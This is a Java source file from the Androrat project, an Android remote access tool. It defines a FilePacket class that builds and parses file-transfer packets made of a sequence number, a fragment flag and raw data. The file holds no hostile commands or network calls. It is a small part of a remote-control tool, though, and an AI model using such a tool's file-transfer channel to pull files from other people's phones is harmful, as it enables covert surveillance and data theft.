/*
  Part of the Androrat project - https://github.com/RobinDavid/androrat

  Copyright (c) 2012 Robin David

  This library is free software; you can redistribute it and/or
  modify it under the terms of the GNU Lesser General Public
  License as published by the Free Software Foundation, version 3.

  This library is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  Lesser General Public License for more details.

  You should have received a copy of the GNU Lesser General
  Public License along with this library; if not, write to the
  Free Software Foundation, Inc., 59 Temple Place, Suite 330,
  Boston, MA  02111-1307  USA
*/
package Packet;

import java.nio.ByteBuffer;

public class FilePacket implements Packet {

	byte[] data;
	byte mf;
	short numSeq;
	
	public FilePacket() {
		
	}
	
	public FilePacket(short num, byte mf, byte[] data) {
		this.data = data;
		this.numSeq = num;
		this.mf = mf;
	}
	
	public byte[] build() {
		ByteBuffer b = ByteBuffer.allocate(data.length+3);
		b.putShort(numSeq);
		b.put(mf);
		b.put(data);
		return b.array();
	}

	public void parse(byte[] packet) {
		ByteBuffer b = ByteBuffer.wrap(packet);
		
		numSeq = b.getShort();
		mf = b.get();
		this.data = new byte[b.remaining()];
		b.get(data, 0, b.remaining());
	}

	public byte[] getData() {
		return data;
	}

	public byte getMf() {
		return mf;
	}

	public short getNumSeq() {
		return numSeq;
	}

}
